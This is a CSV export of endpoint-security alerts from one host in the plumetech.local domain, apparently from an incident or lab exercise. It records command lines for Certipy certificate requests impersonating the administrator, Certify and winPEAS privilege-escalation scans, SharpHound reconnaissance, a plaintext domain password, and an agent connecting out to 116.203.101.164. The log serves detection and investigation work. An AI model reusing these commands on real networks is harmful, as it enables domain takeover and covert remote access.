"timestamp","Host","severity_name","severity","description","cmdline","files_written","entities"
"2025-03-28T10:21:01.969Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" req -username frank@plumetech.local -password REDACTED -ca PLUMETECH-DC1-CA -target 10.0.1.11 -template KerberosAuthentication -upn administrator@plumetech.local -dns 10.0.1.11","@{filename=api-ms-win-core-heap-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93442; timestamp=1743157262},@{filename=api-ms-win-core-debug-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93442; timestamp=1743157262},@{filename=pythoncom310.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93442; timestamp=1743157263},@{filename=api-ms-win-core-sysinfo-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93442; timestamp=1743157263},@{filename=libssl-1_1.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93442; timestamp=1743157263},@{filename=tcl86t.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93442; timestamp=1743157263},@{filename=api-ms-win-crt-heap-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93442; timestamp=1743157263},@{filename=api-ms-win-crt-multibyte-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93442; timestamp=1743157263},@{filename=api-ms-win-core-libraryloader-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93442; timestamp=1743157262},@{filename=api-ms-win-crt-stdio-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93442; timestamp=1743157263}",
"2025-03-28T10:20:10.23Z","10.0.1.29","Informational","10","This file meets the machine learning-based on-sensor AV protection's lowest-confidence threshold for malicious files.","""C:\Users\alice\agent.exe"" -connect 116.203.101.164:5123 -ignore-cert","",
"2025-03-28T10:18:00.32Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" req -username frank@plumetech.local -password REDACTED -ca PLUMETECH-DC1-CA -target PLUMETECH-DC1-CA -template KerberosAuthentication -upn administrator@plumetech.local -dns 10.0.1.11","@{filename=api-ms-win-core-string-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI48922; timestamp=1743157082},@{filename=api-ms-win-crt-convert-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI48922; timestamp=1743157082},@{filename=pywintypes310.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI48922; timestamp=1743157082},@{filename=api-ms-win-core-util-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI48922; timestamp=1743157082},@{filename=api-ms-win-crt-process-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI48922; timestamp=1743157082},@{filename=api-ms-win-crt-multibyte-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI48922; timestamp=1743157082},@{filename=VCRUNTIME140.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI48922; timestamp=1743157082},@{filename=api-ms-win-crt-conio-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI48922; timestamp=1743157082},@{filename=api-ms-win-core-sysinfo-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI48922; timestamp=1743157082},@{filename=api-ms-win-core-fibers-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI48922; timestamp=1743157082}",
"2025-03-28T10:17:17.695Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" req -username frank@plumetech.local -password REDACTED -ca PLUMETECH-DC1-CA -target PLUMETECH-DC1-CA -template KerberosAuthentication -upn administrator@plumetech.local -dns 10.0.1.11","@{filename=api-ms-win-core-handle-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103042; timestamp=1743157038},@{filename=api-ms-win-crt-conio-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103042; timestamp=1743157039},@{filename=api-ms-win-core-rtlsupport-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103042; timestamp=1743157039},@{filename=api-ms-win-core-console-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103042; timestamp=1743157038},@{filename=api-ms-win-core-synch-l1-2-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103042; timestamp=1743157039},@{filename=api-ms-win-core-debug-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103042; timestamp=1743157038},@{filename=api-ms-win-core-processenvironment-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103042; timestamp=1743157039},@{filename=VCRUNTIME140.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103042; timestamp=1743157038},@{filename=libffi-7.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103042; timestamp=1743157039},@{filename=tcl86t.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103042; timestamp=1743157039}",
"2025-03-28T10:12:07.166Z","10.0.1.29","Informational","10","This file meets the machine learning-based on-sensor AV protection's lowest-confidence threshold for malicious files.","""C:\Users\alice\agent.exe"" -connect 116.203.101.164:5123 -ignore-cert","",
"2025-03-28T10:09:18.233Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" find -target dc1 -u frank@plumetech -p servicemaster","@{filename=api-ms-win-crt-heap-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI20842; timestamp=1743156559},@{filename=api-ms-win-crt-process-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI20842; timestamp=1743156559},@{filename=api-ms-win-core-rtlsupport-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI20842; timestamp=1743156559},@{filename=api-ms-win-crt-filesystem-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI20842; timestamp=1743156559},@{filename=api-ms-win-crt-utility-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI20842; timestamp=1743156559},@{filename=api-ms-win-core-interlocked-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI20842; timestamp=1743156559},@{filename=api-ms-win-core-synch-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI20842; timestamp=1743156559},@{filename=api-ms-win-core-errorhandling-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI20842; timestamp=1743156559},@{filename=api-ms-win-core-file-l2-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI20842; timestamp=1743156559},@{filename=api-ms-win-core-processenvironment-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI20842; timestamp=1743156559}",
"2025-03-28T10:08:33.956Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" find -target dc1","@{filename=api-ms-win-crt-locale-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI84122; timestamp=1743156515},@{filename=api-ms-win-crt-conio-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI84122; timestamp=1743156515},@{filename=api-ms-win-core-fibers-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI84122; timestamp=1743156515},@{filename=api-ms-win-core-string-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI84122; timestamp=1743156515},@{filename=api-ms-win-crt-stdio-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI84122; timestamp=1743156515},@{filename=api-ms-win-core-heap-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI84122; timestamp=1743156515},@{filename=api-ms-win-core-localization-l1-2-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI84122; timestamp=1743156515},@{filename=api-ms-win-crt-string-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI84122; timestamp=1743156515},@{filename=pythoncom310.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI84122; timestamp=1743156516},@{filename=api-ms-win-core-libraryloader-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI84122; timestamp=1743156515}",
"2025-03-28T10:08:00.396Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" find --help","@{filename=api-ms-win-core-debug-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI103602; timestamp=1743156481},@{filename=api-ms-win-crt-runtime-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI103602; timestamp=1743156481},@{filename=api-ms-win-core-string-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI103602; timestamp=1743156481},@{filename=api-ms-win-core-file-l1-2-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI103602; timestamp=1743156481},@{filename=api-ms-win-core-processenvironment-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI103602; timestamp=1743156481},@{filename=api-ms-win-core-memory-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI103602; timestamp=1743156481},@{filename=libcrypto-1_1.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI103602; timestamp=1743156481},@{filename=tcl86t.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI103602; timestamp=1743156481},@{filename=ucrtbase.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI103602; timestamp=1743156481},@{filename=api-ms-win-core-profile-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI103602; timestamp=1743156481}",
"2025-03-28T10:07:24.082Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" find","@{filename=api-ms-win-core-file-l1-2-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI31082; timestamp=1743156445},@{filename=api-ms-win-crt-runtime-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI31082; timestamp=1743156445},@{filename=libffi-7.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI31082; timestamp=1743156446},@{filename=api-ms-win-core-debug-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI31082; timestamp=1743156445},@{filename=api-ms-win-core-memory-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI31082; timestamp=1743156445},@{filename=api-ms-win-core-profile-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI31082; timestamp=1743156445},@{filename=pywintypes310.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI31082; timestamp=1743156446},@{filename=api-ms-win-core-datetime-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI31082; timestamp=1743156445},@{filename=api-ms-win-core-processthreads-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI31082; timestamp=1743156445},@{filename=api-ms-win-crt-environment-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI31082; timestamp=1743156445}",
"2025-03-28T10:07:02.255Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe""","@{filename=api-ms-win-crt-runtime-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI41922; timestamp=1743156425},@{filename=api-ms-win-core-profile-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI41922; timestamp=1743156424},@{filename=api-ms-win-crt-multibyte-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI41922; timestamp=1743156424},@{filename=api-ms-win-crt-time-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI41922; timestamp=1743156425},@{filename=api-ms-win-crt-environment-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI41922; timestamp=1743156424},@{filename=api-ms-win-core-debug-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI41922; timestamp=1743156424},@{filename=api-ms-win-crt-conio-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI41922; timestamp=1743156424},@{filename=api-ms-win-core-processenvironment-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI41922; timestamp=1743156424},@{filename=api-ms-win-crt-locale-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI41922; timestamp=1743156424},@{filename=api-ms-win-core-namedpipe-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI41922; timestamp=1743156424}",
"2025-03-28T10:06:15.637Z","10.0.1.29","High","70","A process associated with a known ransomware campaign launched. Investigate the host for signs of a ransomware attack.",".\winPEAS.exe","@{filename=sqlite.interop.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\Costura\27562734BD0EFF9434A8AA8BED4CA874\64; timestamp=1743156315}",
"2025-03-28T10:06:07.04Z","10.0.1.29","High","70","A suspicious process attempted to elevate its privileges using misconfigured Active Directory Domain. Privilege escalation can be used by adversaries to bypass access controls. Review the process tree.","""C:\Users\alice\Downloads\bin\bin\Certify.exe"" find /vulnerable","",
"2025-03-28T10:06:06.53Z","10.0.1.29","Low","30","This file meets the File Analysis ML algorithm's low-confidence threshold for malware.","""C:\Users\alice\Downloads\bin\bin\Certify.exe"" find /vulnerable","",
"2025-03-28T10:06:06.53Z","10.0.1.29","High","70","A process tree contains characteristics often associated with an adversary performing reconnaissance. This might be related to expected administrator activity. If this is unexpected, review the process tree.","""C:\Users\alice\Downloads\bin\bin\Certify.exe"" find /vulnerable","",
"2025-03-28T10:05:59.104Z","10.0.1.29","Low","30","This file meets the File Analysis ML algorithm's low-confidence threshold for malware.","""C:\Users\alice\Downloads\bin\bin\Certify.exe"" find /vulneable","",
"2025-03-28T10:05:30.754Z","10.0.1.29","Low","30","This file meets the File Analysis ML algorithm's low-confidence threshold for malware.","""C:\Users\alice\Downloads\bin\bin\Certify.exe""","",
"2025-03-28T10:05:26.353Z","10.0.1.29","High","70","A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.","C:\Windows\Explorer.EXE","@{filename=Environment.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\helper; timestamp=1743155136},@{filename=WinApi.Wrappers.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\core; timestamp=1743155136},@{filename=IT-Documentation.lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743155469},@{filename=PingCastle_3.3.0.1 (2).lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743156142},@{filename=SharpHound.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\sharphound; timestamp=1743154656},@{filename=Services.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\check; timestamp=1743155136},@{filename=AzureADRecon.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\bin\bin; timestamp=1743156291},@{filename=Downloads.lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743155469},@{filename=OT Software Update & Debugging Concerns.eml.lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743155632},@{filename=Network.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\check; timestamp=1743155136}",
"2025-03-28T10:05:25.821Z","10.0.1.29","High","70","A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.","C:\Windows\Explorer.EXE","@{filename=OT Software Update & Debugging Concerns.eml.lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743155632},@{filename=WinApi.Struct.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\core; timestamp=1743155136},@{filename=PrivescCheck.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master; timestamp=1743155134},@{filename=mail_exports.lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743155632},@{filename=PointAndPrint.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\exploit; timestamp=1743155136},@{filename=SharpHound.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\sharphound; timestamp=1743154656},@{filename=PingCastleAutoUpdater.exe.config; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PingCastle_3.3.0.1; timestamp=1743155002},@{filename=PingCastle_3.3.0.1 (2).lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743156142},@{filename=it (10.0.1.12).lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743155450},@{filename=email_exports.lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743155532}",
"2025-03-28T10:05:25.729Z","10.0.1.29","High","70","A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.","C:\Windows\Explorer.EXE","@{filename=Misc.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\check; timestamp=1743155136},@{filename=Environment.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\helper; timestamp=1743155136},@{filename=SystemConfiguration.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\helper; timestamp=1743155137},@{filename=PingCastleAutoUpdater.exe.config; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PingCastle_3.3.0.1; timestamp=1743155002},@{filename=PointAndPrint.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\release; timestamp=1743155135},@{filename=Msi.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\helper; timestamp=1743155136},@{filename=it (10.0.1.12).lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743155450},@{filename=Reflection.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\core; timestamp=1743155136},@{filename=Updates.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\check; timestamp=1743155136},@{filename=Globals.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\check; timestamp=1743155135}",
"2025-03-28T10:05:24.802Z","10.0.1.29","High","70","A process has written a kernel driver to disk that CrowdStrike analysts have deemed vulnerable. Attackers can use vulnerable drivers to gain privileged access to a system. Review the process tree and file details.","C:\Windows\Explorer.EXE","@{filename=WinApi.Struct.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\core; timestamp=1743155136},@{filename=PrivescCheck.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master; timestamp=1743155134},@{filename=mail_exports.lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743155632},@{filename=ad_hc_plumetech.local.lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743156142},@{filename=SystemConfiguration.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\helper; timestamp=1743155137},@{filename=PingCastle_3.3.0.1 (2).lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743156142},@{filename=AccessControl.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\helper; timestamp=1743155136},@{filename=SystemInformation.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\helper; timestamp=1743155137},@{filename=Misc.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\check; timestamp=1743155136},@{filename=Multithreading.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\core; timestamp=1743155136}",
"2025-03-28T10:05:15.001Z","10.0.1.29","Informational","10","This file meets the machine learning-based on-sensor AV protection's lowest-confidence threshold for malicious files.",".\winPEAS.exe","@{filename=sqlite.interop.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\Costura\27562734BD0EFF9434A8AA8BED4CA874\64; timestamp=1743156315}",
"2025-03-28T10:04:56.239Z","10.0.1.29","High","70","A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.","C:\Windows\Explorer.EXE","@{filename=WinApi.Wrappers.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\core; timestamp=1743155136},@{filename=PingCastle_3.3.0.1 (2).lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743156142},@{filename=Misc.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\check; timestamp=1743155136},@{filename=PingCastleAutoUpdater.exe.config; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PingCastle_3.3.0.1; timestamp=1743155002},@{filename=SystemConfiguration.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\helper; timestamp=1743155137},@{filename=PrivescCheck.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\release; timestamp=1743155135},@{filename=OT Software Update & Debugging Concerns.eml.lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743155632},@{filename=Hardening.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\check; timestamp=1743155135},@{filename=Globals.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\check; timestamp=1743155135},@{filename=SharpHound.exe.config; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\sharphound; timestamp=1743154656}",
"2025-03-28T10:04:55.582Z","10.0.1.29","High","70","A process has written a suspicious file to disk. Adversaries may write a malicious file to a commonly trusted directory, use a benign name, or a mismatched file extension. This is done for the sake of evading defenses and observation. Check the activity and surrounding events are expected in your environment.","C:\Windows\Explorer.EXE","@{filename=email_exports.lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743155532},@{filename=PrivescCheck.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master; timestamp=1743155134},@{filename=User.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\check; timestamp=1743155136},@{filename=IT-Documentation.lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743155449},@{filename=ad_hc_plumetech.local.lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743156142},@{filename=it (10.0.1.12).lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743155450},@{filename=Credentials.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\check; timestamp=1743155135},@{filename=Multithreading.ps1; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\PrivescCheck-master\PrivescCheck-master\src\core; timestamp=1743155136},@{filename=PingCastle_3.3.0.1.lnk; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743154996},@{filename=SharpHound.exe; filepath=\Device\HarddiskVolume1\Users\alice\Downloads\sharphound; timestamp=1743154654}",
